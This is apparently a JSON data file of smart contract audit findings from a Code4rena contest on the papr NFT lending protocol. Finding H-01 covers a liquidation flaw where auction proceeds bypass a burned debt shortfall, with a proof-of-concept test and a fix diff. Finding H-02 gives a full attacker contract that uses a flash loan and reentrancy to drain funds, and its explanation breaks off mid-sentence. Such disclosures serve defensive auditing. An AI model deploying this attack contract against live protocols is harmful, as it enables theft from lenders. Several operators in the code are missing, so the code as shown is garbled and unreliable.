[
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\nif (isLastCollateral && remaining != 0) {\n    /// there will be debt left with no NFTs, set it to 0\n    _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n}\n",
                    "//solidity\nif (excess  0) {\n    remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);\n}\n",
                    "//solidity\ndiff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol\nnew file mode 100644\nindex 0000000..0b12914\n--/dev/null\n+++ b/test/paprController/PoC.sol\n@@ -0,0 +1,147 @@\n+// SPDX-License-Identifier: GPL-2.0-or-later\n+pragma //solidity ^0.8.17;\n+\n+import \"forge-std/console.sol\";\n+import {ERC721} from \"solmate/tokens/ERC721.sol\";\n+\n+import {ReservoirOracleUnderwriter} from \"../../src/ReservoirOracleUnderwriter.sol\";\n+import {INFTEDA} from \"../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol\";\n+\n+import {BasePaprControllerTest} from \"./BasePaprController.ft.sol\";\n+import {IPaprController} from \"../../src/interfaces/IPaprController.sol\";\n+\n+contract PoC is BasePaprControllerTest {\n+    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount);\n+    event Transfer(address indexed from, address indexed to, uint256 amount);\n+\n+    INFTEDA.Auction auction1;\n+    INFTEDA.Auction auction2;\n+    address purchaser = address(2);\n+\n+    function setUp() public override {\n+        super.setUp();\n+\n+        // mint a second collateral\n+        nft.mint(borrower, collateralId+1);\n+        // add collaterals, loan max and sells\n+        _addCollaterals();\n+        _loanMaxAndSell();\n+        // borrower now has 2.9... USD\n+        assertGt(underlying.balanceOf(borrower), 2.9e6);\n+\n+        // prepare purchaser\n+        vm.startPrank(purchaser);\n+        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) 10;\n+        safeTransferReceivedArgs.proceedsTo = purchaser;\n+        safeTransferReceivedArgs.swapParams.minOut = 0;\n+        for (uint i = 0; i < 3; i ++) {\n+            nft.mint(purchaser, 10+i);\n+            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs));\n+        }\n+        vm.stopPrank();\n+        // purchaser now has 4.4... papr\n+        assertGt(debtToken.balanceOf(purchaser), 4.4e18);\n+\n+        // make max loan liquidatable\n+        vm.warp(block.timestamp + 1 days);\n+        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+    }\n+\n+    function testPoC() public {\n+        vm.startPrank(purchaser);\n+        debtToken.approve(address(controller), type(uint256).max);\n+\n+        // start auction1, collateralId\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo);\n+\n+        // nobody purchage auction1 for some reason(like nft price falling)\n+\n+        // start auction2, collateralId+1\n+        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing());\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        auction2 = controller.startLiquidationAuction(\n+            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo);\n+\n+        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr);\n+        assertGt(info.debt, 2.99e18);\n+\n+        // purchase auction1\n+        uint256 beforeBalance = debtToken.balanceOf(borrower);\n+        uint256 price = controller.auctionCurrentPrice(auction1);\n+        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4;\n+        uint256 reduced = price penalty;\n+        uint256 shortfall = info.debt reduced;\n+        // burn penalty\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), penalty);\n+        // reduce debt (partial)\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, reduced);\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), reduced);\n+        //!! burning the shortfall debt not covered by auction\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, shortfall);\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo);\n+\n+        // reduced: 0.65..\n+        assertLt(reduced, 0.66e18);\n+        // fortfall: 2.34..\n+        assertGt(shortfall, 2.34e18);\n+        //!! debt is 0 now\n+        info = controller.vaultInfo(borrower, collateral.addr);\n+        assertEq(info.debt, 0);\n+\n+        // purchase auction2\n+        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29\n+        vm.warp(block.timestamp + 78831);\n+        beforeBalance = debtToken.balanceOf(borrower);\n+        price = controller.auctionCurrentPrice(auction2);\n+        penalty = price * controller.liquidationPenaltyBips() / 1e4;\n+        uint256 payouts = price penalty;\n+        // burn penalty\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), penalty);\n+        //!! reduce 0 because debt is 0\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, 0);\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), 0);\n+        //!! borrower get the payouts that should be used to reduce the shortfall debt\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), borrower, payouts);\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo);\n+\n+        //!! borrower wins\n+        uint256 afterBalance = debtToken.balanceOf(borrower);\n+        assertEq(afterBalance beforeBalance, payouts);\n+        assertGt(payouts, 2.4e18);\n+    }\n+\n+    function _addCollaterals() internal {\n+        vm.startPrank(borrower);\n+        nft.setApprovalForAll(address(controller), true);\n+        IPaprController.Collateral[] memory c = new IPaprController.Collateral[(2);\n+        c[0] = collateral;\n+        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft});\n+        controller.addCollateral(c);\n+        vm.stopPrank();\n+    }\n+\n+    function _loanMaxAndSell() internal {\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({\n+            amount: controller.maxDebt(oraclePrice*2) 4,\n+            minOut: 1,\n+            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}),\n+            swapFeeTo: address(0),\n+            swapFeeBips: 0\n+        });\n+        vm.prank(borrower);\n+        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo);\n+    }\n+}\n"
                ],
                "Type": " Borrowers may earn auction proceeds without filling the debt shortfall",
                "Description": "*Submitted by hihen(https://github.com/code-423n4/2022-12-backed-findings/issues/97), also found by bin2chen(https://github.com/code-423n4/2022-12-backed-findings/issues/214), rvierdiiev(https://github.com/code-423n4/2022-12-backed-findings/issues/136), and HollaDieWaldfee(https://github.com/code-423n4/2022-12-backed-findings/issues/70)*\n\nThe proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.\n\n\nAssume N is an allowed NFT, B is a borrower, the vault V is _vaultInfo[B][N]:\n\n1.  B add two NFTs (N-1 and N-2) as collaterals to vault V.\n2.  B increaseDebt()(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V.\n3.  The vault V becomes liquidatable.\n4.  Someone calls startLiquidationAuction()(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1.\n5.  No one buys N-1 because the price of N is falling.\n6.  After liquidationAuctionMinSpacing 2days(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls startLiquidationAuction()(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2.\n7.  Someone calls purchaseLiquidationAuctionNFT(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:\n\nsolidity\nif (isLastCollateral && remaining != 0) {\n    /// there will be debt left with no NFTs, set it to 0\n    _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n}\n\n\n8.  Someone calls purchaseLiquidationAuctionNFT(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because neededToSaveVault is 0 and debtCached is 0:\n\nsolidity\nif (excess  0) {\n    remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);\n}\n\n\nThe tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.\nTest code for PoC:\n\nsolidity\ndiff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol\nnew file mode 100644\nindex 0000000..0b12914\n--/dev/null\n+++ b/test/paprController/PoC.sol\n@@ -0,0 +1,147 @@\n+// SPDX-License-Identifier: GPL-2.0-or-later\n+pragma solidity ^0.8.17;\n+\n+import \"forge-std/console.sol\";\n+import {ERC721} from \"solmate/tokens/ERC721.sol\";\n+\n+import {ReservoirOracleUnderwriter} from \"../../src/ReservoirOracleUnderwriter.sol\";\n+import {INFTEDA} from \"../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol\";\n+\n+import {BasePaprControllerTest} from \"./BasePaprController.ft.sol\";\n+import {IPaprController} from \"../../src/interfaces/IPaprController.sol\";\n+\n+contract PoC is BasePaprControllerTest {\n+    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount);\n+    event Transfer(address indexed from, address indexed to, uint256 amount);\n+\n+    INFTEDA.Auction auction1;\n+    INFTEDA.Auction auction2;\n+    address purchaser = address(2);\n+\n+    function setUp() public override {\n+        super.setUp();\n+\n+        // mint a second collateral\n+        nft.mint(borrower, collateralId+1);\n+        // add collaterals, loan max and sells\n+        _addCollaterals();\n+        _loanMaxAndSell();\n+        // borrower now has 2.9... USD\n+        assertGt(underlying.balanceOf(borrower), 2.9e6);\n+\n+        // prepare purchaser\n+        vm.startPrank(purchaser);\n+        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) 10;\n+        safeTransferReceivedArgs.proceedsTo = purchaser;\n+        safeTransferReceivedArgs.swapParams.minOut = 0;\n+        for (uint i = 0; i < 3; i ++) {\n+            nft.mint(purchaser, 10+i);\n+            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs));\n+        }\n+        vm.stopPrank();\n+        // purchaser now has 4.4... papr\n+        assertGt(debtToken.balanceOf(purchaser), 4.4e18);\n+\n+        // make max loan liquidatable\n+        vm.warp(block.timestamp + 1 days);\n+        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+    }\n+\n+    function testPoC() public {\n+        vm.startPrank(purchaser);\n+        debtToken.approve(address(controller), type(uint256).max);\n+\n+        // start auction1, collateralId\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo);\n+\n+        // nobody purchage auction1 for some reason(like nft price falling)\n+\n+        // start auction2, collateralId+1\n+        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing());\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        auction2 = controller.startLiquidationAuction(\n+            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo);\n+\n+        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr);\n+        assertGt(info.debt, 2.99e18);\n+\n+        // purchase auction1\n+        uint256 beforeBalance = debtToken.balanceOf(borrower);\n+        uint256 price = controller.auctionCurrentPrice(auction1);\n+        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4;\n+        uint256 reduced = price penalty;\n+        uint256 shortfall = info.debt reduced;\n+        // burn penalty\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), penalty);\n+        // reduce debt (partial)\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, reduced);\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), reduced);\n+        //!! burning the shortfall debt not covered by auction\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, shortfall);\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo);\n+\n+        // reduced: 0.65..\n+        assertLt(reduced, 0.66e18);\n+        // fortfall: 2.34..\n+        assertGt(shortfall, 2.34e18);\n+        //!! debt is 0 now\n+        info = controller.vaultInfo(borrower, collateral.addr);\n+        assertEq(info.debt, 0);\n+\n+        // purchase auction2\n+        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29\n+        vm.warp(block.timestamp + 78831);\n+        beforeBalance = debtToken.balanceOf(borrower);\n+        price = controller.auctionCurrentPrice(auction2);\n+        penalty = price * controller.liquidationPenaltyBips() / 1e4;\n+        uint256 payouts = price penalty;\n+        // burn penalty\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), penalty);\n+        //!! reduce 0 because debt is 0\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, 0);\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), 0);\n+        //!! borrower get the payouts that should be used to reduce the shortfall debt\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), borrower, payouts);\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo);\n+\n+        //!! borrower wins\n+        uint256 afterBalance = debtToken.balanceOf(borrower);\n+        assertEq(afterBalance beforeBalance, payouts);\n+        assertGt(payouts, 2.4e18);\n+    }\n+\n+    function _addCollaterals() internal {\n+        vm.startPrank(borrower);\n+        nft.setApprovalForAll(address(controller), true);\n+        IPaprController.Collateral[] memory c = new IPaprController.Collateral[(2);\n+        c[0] = collateral;\n+        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft});\n+        controller.addCollateral(c);\n+        vm.stopPrank();\n+    }\n+\n+    function _loanMaxAndSell() internal {\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({\n+            amount: controller.maxDebt(oraclePrice*2) 4,\n+            minOut: 1,\n+            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}),\n+            swapFeeTo: address(0),\n+            swapFeeBips: 0\n+        });\n+        vm.prank(borrower);\n+        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo);\n+    }\n+}\n\n\nTest output:\n\n    Running 1 test for test/paprController/PoC.sol:PoC\n    PASS] testPoC() (gas: 720941)\n    Test result: ok. 1 passed; 0 failed; finished in 1.21s\n\n\nVS Code\n\n",
                "Repair": "\nThe debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.\n\nImplementation code:\n\nsolidity\ndiff --git a/src/PaprController.sol b/src/PaprController.sol\nindex 284b3f4..d7e4cea 100644\n--a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -61,6 +61,8 @@ contract PaprController is\n\n     /// @dev account = asset = vaultInfo\n     mapping(address = mapping(ERC721 = IPaprController.VaultInfo)) private _vaultInfo;\n+    /// @dev account = asset = shortfall amount\n+    mapping(address = mapping(ERC721 = uint256)) private _shortfall;\n\n     /// @dev does not validate args\n     /// e.g. does not check whether underlying or oracleSigner are address(0)\n@@ -288,6 +290,8 @@ contract PaprController is\n         }\n\n         if (isLastCollateral && remaining != 0) {\n+            // increase shortfall\n+            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;\n             /// there will be debt left with no NFTs, set it to 0\n             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n         }\n@@ -408,6 +412,10 @@ contract PaprController is\n         return _vaultInfo[account][asset];\n     }\n\n+    function shortfall(address account, ERC721 asset) external view returns (uint256) {\n+        return _shortfall[account][asset];\n+    }\n+\n     /// INTERNAL NON-VIEW ///\n\n     function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {\n@@ -543,7 +551,20 @@ contract PaprController is\n             // we owe them more papr than they have in debt\n             // so we pay down debt and send them the rest\n             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached);\n           papr.transfer(auction.nftOwner, totalOwed debtCached);\n+\n+            uint256 payout = totalOwed debtCached;\n+            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract];\n+            if (burnShortfall = payout) {\n+                burnShortfall = payout;\n+            }\n+            if (burnShortfall  0) {\n+                // burn the previous shortfall\n+                PaprToken(address(papr)).burn(address(this), burnShortfall);\n+                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall;\n+            }\n+            if (payout  burnShortfall) {\n+                papr.transfer(auction.nftOwner, payout burnShortfall);\n+            }\n         } else {\n             // reduce vault debt\n             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed);\n\n\nJeiwan (warden) commented(https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1369802651):\n  State mismanagement causes writing off of a bad debt while there's still a collateral NFT being auctioned. As a result, the proceedings of the auction are not used to repay the bad debt and are sent directly to the debtor.\n\nwilsoncusack (Backed) confirmed and commented(https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1370080925):\n  Agree with @Jeiwan. The isLastCollateral check should also check whether there is another auction ongoing: https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527\n\n*\n\n\n"
            },
            {
                "Name": "H-02",
                "Location": [
                    "\n// SPDX-License-Identifier: MIT\npragma //solidity 0.8.0;\n\ninterface ERC721 {}\n\ninterface ERC20 {}\n\nstruct Collateral {\n    ERC721 addr;\n    uint256 id;\n}\nstruct OracleInfo {\n    Message message;\n    Sig sig;\n}\nstruct Message {\n    bytes32 id;\n    bytes payload;\n    uint256 timestamp;\n    bytes signature;\n}\nstruct Sig {\n    uint8 v;\n    bytes32 r;\n    bytes32 s;\n}\nstruct Auction {\n    address nftOwner;\n    uint256 auctionAssetID;\n    ERC721 auctionAssetContract;\n    uint256 perPeriodDecayPercentWad;\n    uint256 secondsInPeriod;\n    uint256 startPrice;\n    ERC20 paymentAsset;\n}\n\nenum PriceKind {\n    SPOT,\n    TWAP,\n    LOWER,\n    UPPER\n}\n\ninterface IPaprController {\n    function addCollateral(Collateral[] calldata collateral) external;\n\n    function increaseDebt(\n        address mintTo,\n        ERC721 asset,\n        uint256 amount,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function removeCollateral(\n        address sendTo,\n        Collateral[] calldata collateralArr,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function startLiquidationAuction(\n        address account,\n        Collateral calldata collateral,\n        OracleInfo calldata oracleInfo\n    ) external returns (Auction memory auction);\n\n    function purchaseLiquidationAuctionNFT(\n        Auction calldata auction,\n        uint256 maxPrice,\n        address sendTo,\n        OracleInfo calldata oracleInfo\n    ) external;\n\n    function maxDebt(uint256 totalCollateraValue)\n        external\n        view\n        returns (uint256);\n\n    function underwritePriceForCollateral(\n        ERC721 asset,\n        PriceKind priceKind,\n        OracleInfo memory oracleInfo\n    ) external returns (uint256);\n}\n\ninterface IFundingRateController {\n    function updateTarget() external returns (uint256);\n}\n\ninterface IAAVE {\n    function flashLoanSimple(\n        address receiverAddress,\n        address asset,\n        uint256 amount,\n        bytes calldata params,\n        uint16 referralCode\n    ) external;\n}\n\ncontract BobContract {\n    IPaprController iPaprController;\n    IFundingRateController iFundingRateController;\n    IAAVE iAAVE;\n    ERC721 nftCollectionAddress;\n    ERC20 paprToken;\n    Collateral[] collaterals;\n    OracleInfo oracleInfo;\n    uint256 numOfCallback;\n    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    constructor(\n        address _paprControllerAddress,\n        address _fundingRateControllerAddress,\n        address _aaveAddress,\n        ERC721 _nftCollectionAddress,\n        OracleInfo memory _oracleInfo,\n        ERC20 _paprToken\n    ) {\n        iPaprController = IPaprController(_paprControllerAddress);\n        iFundingRateController = IFundingRateController(\n            _fundingRateControllerAddress\n        );\n        iAAVE = IAAVE(_aaveAddress);\n        nftCollectionAddress = _nftCollectionAddress;\n        oracleInfo = _oracleInfo;\n        paprToken = _paprToken;\n    }\n\n    function attack() public {\n        ///// STEP1: taking flash loan\n        iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 106, \"\", 0);\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        ///// STEP2: buying 10 NFTs\n\n        // Buy 10 NFTs that each worths almost 50k\n        // Assume the ids are from 1 to 10\n\n        ///// STEP3: adding the NFTs as collateral\n        for (uint256 i = 0; i < 10; ++i) {\n            collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));\n        }\n        iPaprController.addCollateral(collaterals);\n\n        ///// STEP4: borrowing as much as possible\n        uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n            nftCollectionAddress,\n            PriceKind.LOWER,\n            oracleInfo\n        );\n\n        uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);\n\n        iPaprController.increaseDebt(\n            address(this),\n            nftCollectionAddress,\n            maxDebt,\n            oracleInfo\n        );\n\n        ///// STEP5: removing the NFT with id 1\n        Collateral[] memory collateralArr = new Collateral[(1);\n        collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});\n        iPaprController.removeCollateral(\n            address(this),\n            collateralArr,\n            oracleInfo\n        );\n\n        ///// STEP16: selling 10 NFTs and repaying the flash loan\n\n        // Selling the 10 NFTs\n        // Repaying the flash loan\n    }\n\n    function onERC721Received(\n        address from,\n        address,\n        uint256 _id,\n        bytes calldata data\n    ) external returns (bytes4) {\n        numOfCallback++;\n        if (numOfCallback < 9) {\n            ///// STEP6 STEP13: removing the NFTs with id 2 to 9\n            Collateral[] memory collateralArr = new Collateral[(1);\n            collateralArr[0] = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.removeCollateral(\n                address(this),\n                collateralArr,\n                oracleInfo\n            );\n        } else {\n            ///// STEP14: starting the auction for NFT with id 10\n            Collateral memory lastCollateral = Collateral({\n                addr: nftCollectionAddress,\n                id: _id + 1\n            });\n            iPaprController.startLiquidationAuction(\n                address(this),\n                lastCollateral,\n                oracleInfo\n            );\n\n            ///// STEP15: buying the NFT with id 10 on the auction\n            uint256 oraclePrice = iPaprController.underwritePriceForCollateral(\n                nftCollectionAddress,\n                PriceKind.LOWER,\n                oracleInfo\n            );\n            uint256 startPrice = (oraclePrice * 3 * 1e18) /\n                iFundingRateController.updateTarget();\n\n            Auction memory auction = Auction({\n                nftOwner: address(this),\n                auctionAssetID: 10,\n                auctionAssetContract: nftCollectionAddress,\n                perPeriodDecayPercentWad: 0.7e18,\n                secondsInPeriod: 1 days,\n                startPrice: startPrice,\n                paymentAsset: paprToken\n            });\n\n            iPaprController.purchaseLiquidationAuctionNFT(\n                auction,\n                startPrice,\n                address(this),\n                oracleInfo\n            );\n        }\n    }\n}\n\n"
                ],
                "Type": " Stealing fund by applying reentrancy attack on  removeCollateral ,  startLiquidationAuction , and  purchaseLiquidationAuctionNFT ",
                "Description": "*Submitted by HE1M(https://github.com/code-423n4/2022-12-backed-findings/issues/102), also found by unforgiven(https://github.com/code-423n4/2022-12-backed-findings/issues/242), hihen(https://github.com/code-423n4/2022-12-backed-findings/issues/195), rvierdiiev(https://github.com/code-423n4/2022-12-backed-findings/issues/138), and Bobface(https://github.com/code-423n4/2022-12-backed-findings/issues/63)*\n\nBy applying reentrancy attack involving the functions removeCollateral, startLiquidationAuction, and purchaseLiquidationAuctionNFT, an Attacker can steal large amount of funds.\n\n\n*   Bob (a malicious user) deploys a contract to apply the attack. This contract is called BobContract. Please note that all the following transactions are going to be done in one transaction.\n*   BobContract takes a flash loan of 500K USDC.\n*   BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has a price of almost 50K USDC.\n*   BobContract adds those NFTs as collateral by calling the function addCollateral. So _vaultInfo[BobContract][collateral.addr].count = 10.\n\n<!----\n\n    function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {\n            for (uint256 i = 0; i < collateralArr.length;) {\n                _addCollateralToVault(msg.sender, collateralArr[i]);\n                collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);\n                unchecked {\n                    ++i;\n                }\n            }\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98\n\n*   BobContract borrows the max allowed amount of PaprToken that is almost equivalent to 250K USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function increaseDebt.\n\n<!----\n\n    function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {\n           if (_lastUpdated == block.timestamp) {\n               return _maxDebt(totalCollateraValue, _target);\n           }\n\n           return _maxDebt(totalCollateraValue, newTarget());\n       }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393\n\n    function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {\n            uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;\n            return maxLoanUnderlying / cachedTarget;\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556\n\n    function increaseDebt(\n            address mintTo,\n            ERC721 asset,\n            uint256 amount,\n            ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo\n        ) external override {\n            _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138\n\n*   BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.\n*   BobContract intends to call the function removeCollateral. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%).\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109\n\n*   Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function _removeCollateral, the safeTransferFrom callbacks the BobContract.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444\n\n<https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120\n\n*   In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).\n*   BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function startLiquidationAuction to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and _vaultInfo[BobContract][collateral.addr].count = 1. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297\n\n*   After calling the function startLiquidationAuction, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, info.count = 1, so debt is larger than max debt.\n\n<!----\n\n    if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n                revert IPaprController.NotLiquidatable();\n            }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317\n\n*   Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so _vaultInfo[msg.sender][collateral.addr].count = 0. Moreover, the starting price for this NFT will be 3*oraclePrice (because the auctionStartPriceMultiplier = 3), so it will be almost 3 * 50k = 150k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341\n\n*   BobContract calls the function purchaseLiquidationAuctionNFT to buy it's own NFT with id 10 which is priced at almost 150k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264\n\n*   In this function, we have the followoing variables:\n    *    collateralValueCached   = 150k * 0 = 0\n    *    isLastCollateral   = TRUE\n    *    debtCached   = 250k (same as before)\n    *    maxDebtCached   = 250k\n    *    neededToSaveVault   = 0\n    *    price   = 150k Please note that the functions _purchaseNFTAndUpdateVaultIfNeeded and _purchaseNFT are called that takes 150k from BobContract and transfers that last NFT with id 10 to 